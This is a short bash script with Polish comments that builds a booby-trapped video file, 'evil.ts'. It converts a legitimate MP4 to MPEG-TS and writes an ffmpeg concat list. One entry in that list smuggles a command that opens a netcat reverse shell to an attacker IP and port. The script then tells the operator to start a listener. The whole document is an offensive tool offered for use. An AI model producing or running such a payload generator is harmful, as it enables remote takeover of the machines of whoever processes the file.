#!/bin/bash

# Konfiguracja
ATTACKER_IP="192.168.1.100"
ATTACKER_PORT="4444"

# Sprawdź plik źródłowy
if [ ! -f "legit.mp4" ]; then
  echo "[!] Brakuje pliku 'legit.mp4'"
  exit 1
fi

# Konwersja legitnego pliku do .ts
echo "[*] Konwertowanie legit.mp4 -> legit.ts..."
ffmpeg -i legit.mp4 -c copy -bsf:v h264_mp4toannexb -f mpegts legit.ts

# Tworzenie listy
echo "[*] Tworzenie list.txt..."
echo "file 'legit.ts'" > list.txt
echo "file '|/bin/bash -c \"nc $ATTACKER_IP $ATTACKER_PORT -e /bin/sh\"'" >> list.txt

# Łączenie
echo "[*] Generowanie evil.ts..."
ffmpeg -f concat -safe 0 -i list.txt -c copy evil.ts

# Podsumowanie
if [[ -f "evil.ts" ]]; then
  echo "[+] Gotowe! Plik 'evil.ts' utworzony."
  echo "[!] Nasłuchuj połączenia: nc -lvnp $ATTACKER_PORT"
else
  echo "[!] Coś poszło nie tak – nie utworzono pliku evil.ts."
fi
